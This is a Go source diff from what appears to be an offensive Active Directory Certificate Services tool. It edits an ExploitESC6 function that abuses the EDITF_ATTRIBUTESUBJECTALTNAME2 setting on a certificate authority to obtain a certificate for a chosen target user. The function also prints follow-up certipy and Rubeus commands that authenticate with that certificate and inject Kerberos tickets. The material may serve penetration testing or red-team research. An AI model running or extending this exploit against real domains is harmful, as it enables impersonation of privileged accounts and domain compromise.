@@ -1,7 +1,7 @@
 package pki
 
 import (
-	"crypto/ecdsa"
+	"crypto"
 	"crypto/x509"
 	"fmt"
 	"strings"
@@ -72,7 +72,7 @@ func ScanESC6(cfg *ADCSConfig) ([]ESC6Finding, error) {
 // where the template must allow enrollee-supplied subjects, ESC6 works because
 // the CA itself processes SAN extensions from request attributes — the SAN is
 // injected at the CA level regardless of template configuration.
-func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
+func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
 	fmt.Printf("[!] ESC6 Exploitation: template=%s target=%s\n", templateName, targetUPN)
 
 	// Step 1: Verify a CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
@@ -123,7 +123,7 @@ func ExploitESC6(cfg *ADCSConfig, templateName, targetUPN string) (*x509.Certifi
 	fmt.Printf("[+] Certificate obtained for %s via ESC6 on CA %q using template %q\n", targetUPN, findings[0].CAName, templateName)
 	fmt.Printf("[*] SAN injected via EDITF_ATTRIBUTESUBJECTALTNAME2 CA policy\n")
 	fmt.Printf("[*] Next steps:\n")
-	fmt.Printf("    certipy auth -pfx %s.pfx -dc-ip %s\n", upnUser, cfg.TargetDC)
+	fmt.Printf("    certipy-ad auth -pfx %s.pfx -dc-ip <DC_IP> -domain %s\n", upnUser, cfg.Domain)
 	fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s.pfx /ptt\n", targetUPN, upnUser)
 	fmt.Printf("    # Note: ESC6 works on ANY template — the CA processes the SAN attribute globally\n")
 	return cert, certKey, nil
